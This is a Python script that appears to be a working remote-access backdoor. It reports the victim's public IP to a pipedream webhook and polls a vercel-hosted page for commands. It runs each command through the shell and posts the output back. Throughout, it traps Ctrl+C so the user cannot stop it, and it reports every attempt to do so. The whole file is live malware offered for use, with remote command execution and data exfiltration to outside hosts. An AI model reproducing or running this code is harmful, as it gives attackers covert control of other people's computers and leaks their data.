try:
    from requests import get, post
    from time import sleep
    from subprocess import check_output as system
    from os import chdir

    old_command = ""
    command = ""

    ip = get('https://api.ipify.org').content.decode('utf8')
    post("https://eo482aoknyxae8c.m.pipedream.net", data=f"New client IP: `{ip}`")
except KeyboardInterrupt:
    try:
        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when init``")
    except KeyboardInterrupt:
        pass
    pass

while True:
    # prevent keyboardinterrupt
    try:
        #get HTML
        try:
            command = get("https://discord-bot-command-inputter-littleblack111.vercel.app").content.decode()
            if command.startswith('Error: 429 - {"message": "You are being rate limited.", "retry_after":'):
                try:
                    sleep(5)
                    continue
                except KeyboardInterrupt:
                    post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when waiting discord api timeout(rate-limit)``")
        except KeyboardInterrupt:
            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when handling discord api``")
            continue
        except:
            print("Failed to connect to server")
            sleep(3)
            continue
            # execute command
        if old_command != command:
            try:
                if command.startswith("ping"):
                    try:
                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: Pong!")
                    except KeyboardInterrupt:
                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when replying to ping``")
                    except:
                        print("Failed to connect to server")
                        continue
                if command.startswith("cd"):
                    dir=command.replace('cd', '')
                    try:
                        chdir(dir)
                    except KeyboardInterrupt:
                        try:
                            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) while changing directory``")
                        except KeyboardInterrupt:
                            continue
                        continue
                    except FileNotFoundError:
                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"``$ {command}`` ```No Such Directory```-{ip}")
                    except:
                        print("Failed to connect to server")
                        continue

                cmdout = system(command, shell=True).decode()
                if cmdout != "":
                    try:
                        post("https://eo482aoknyxae8c.m.pipedream.net", data=f"``$ {command}`` ```{cmdout}```- {ip}")
                    except KeyboardInterrupt:
                        try:
                            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C) when trying to post output``")
                        except KeyboardInterrupt:
                                continue
                        continue
                    except:
                        print("Failed to sent output")
                        continue
                old_command = command
                continue
            except:
                continue
        try:
            sleep(0.1)
        except KeyboardInterrupt:
            try:
                post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C)``")
            except KeyboardInterrupt:
                continue
            continue
    except KeyboardInterrupt:
        try:
            post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: ``Client tried to SIGINT(Ctrl+C)``")
        except KeyboardInterrupt:
            continue
        continue
